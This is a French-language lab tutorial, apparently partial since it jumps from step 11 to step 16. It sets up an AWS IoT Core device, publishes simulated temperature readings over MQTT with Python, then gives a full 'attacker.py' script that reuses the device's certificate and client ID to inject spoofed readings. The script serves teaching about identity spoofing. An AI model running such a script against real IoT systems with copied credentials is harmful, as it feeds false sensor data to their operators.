Ce laboratoire explique, étape par étape, comment créer un objet connecté dans AWS IoT Core, le connecter depuis Windows avec Python, publier des données MQTT, puis comprendre une attaque simple d'usurpation d'identité.

Créer le script du capteur

Étape 11 — Créer start.py

Dans PowerShell :

notepad C:\LAB08\scripts\start.py

Cliquer sur Oui, puis coller ce code :

from awscrt import mqtt
from awsiot import mqtt_connection_builder
import json
import random
import time
import os

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CONFIG_PATH = os.path.join(BASE_DIR, "config", "config.json")

with open(CONFIG_PATH, "r") as f:
    config = json.load(f)

endpoint = config["endpoint"]
client_id = config["client_id"]
topic = config["topic"]

root_ca = os.path.join(BASE_DIR, config["root_ca"])
certificate = os.path.join(BASE_DIR, config["certificate"])
private_key = os.path.join(BASE_DIR, config["private_key"])

print("====================================")
print(" LAB 08 - CAPTEUR IOT AWS")
print("====================================")
print("Endpoint :", endpoint)
print("ClientID :", client_id)
print("Topic    :", topic)
print("====================================")

mqtt_connection = mqtt_connection_builder.mtls_from_path(
    endpoint=endpoint,
    cert_filepath=certificate,
    pri_key_filepath=private_key,
    ca_filepath=root_ca,
    client_id=client_id,
    clean_session=False,
    keep_alive_secs=30
)

print("[1] Connexion a AWS IoT Core...")

try:
    connect_future = mqtt_connection.connect()
    connect_future.result()
    print("[OK] Connexion reussie.")
except Exception as e:
    print("[ERREUR] Connexion impossible.")
    print(e)
    exit(1)

for i in range(10):
    temperature = round(random.uniform(21.0, 27.0), 2)

    message = {
        "device": "capteurlamp1",
        "temperature": temperature,
        "unit": "C",
        "message_number": i + 1
    }

    payload = json.dumps(message)

    mqtt_connection.publish(
        topic=topic,
        payload=payload,
        qos=mqtt.QoS.AT_LEAST_ONCE
    )

    print("Message envoye :", payload)
    time.sleep(2)

disconnect_future = mqtt_connection.disconnect()
disconnect_future.result()
print("Deconnexion terminee.")

Enregistrer avec Ctrl + S, puis fermer.

Étape 16 — Créer attacker.py

notepad C:\LAB08_ATTACKER\scripts\attacker.py

Coller :

from awscrt import mqtt
from awsiot import mqtt_connection_builder
import json
import time
import os

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
CONFIG_PATH = os.path.join(BASE_DIR, "config", "config.json")

with open(CONFIG_PATH, "r") as f:
    config = json.load(f)

endpoint = config["endpoint"]
client_id = config["client_id"]
topic = config["topic"]

root_ca = os.path.join(BASE_DIR, config["root_ca"])
certificate = os.path.join(BASE_DIR, config["certificate"])
private_key = os.path.join(BASE_DIR, config["private_key"])

print("====================================")
print(" SIMULATION ATTAQUE IOT")
print("====================================")

mqtt_connection = mqtt_connection_builder.mtls_from_path(
    endpoint=endpoint,
    cert_filepath=certificate,
    pri_key_filepath=private_key,
    ca_filepath=root_ca,
    client_id=client_id,
    clean_session=False,
    keep_alive_secs=30
)

print("[1] Connexion attaquant...")

try:
    connect_future = mqtt_connection.connect()
    connect_future.result()
    print("[OK] Attaquant connecte.")
except Exception as e:
    print("[ERREUR] Connexion impossible.")
    print(e)
    exit(1)

for i in range(5):
    message = {
        "device": "capteurlamp1",
        "temperature": -99.99,
        "unit": "C",
        "attack": True
    }

    payload = json.dumps(message)

    mqtt_connection.publish(
        topic=topic,
        payload=payload,
        qos=mqtt.QoS.AT_LEAST_ONCE
    )

    print("Attaque envoyee :", payload)
    time.sleep(1)

disconnect_future = mqtt_connection.disconnect()
disconnect_future.result()
print("Fin de l'attaque.")
